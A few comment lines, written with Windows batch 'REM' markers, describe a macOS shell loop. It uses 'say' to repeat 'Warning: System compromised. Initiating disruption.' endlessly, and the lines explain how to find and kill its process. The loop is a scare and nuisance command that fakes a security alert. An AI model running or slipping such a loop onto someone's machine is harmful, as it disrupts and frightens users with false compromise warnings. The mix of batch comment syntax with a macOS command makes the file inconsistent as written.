REM continuously generating warning messages using the "say" command in macOS.

REM To end the loop you need to Kill the PID 
REM Use the command <ps aux | grep 'sh -c while true; do say "Warning: System compromised. Initiating disruption."; done'>
REM to find the PID 
REM Run the command 'Kill PID #' to end the warning message loop.
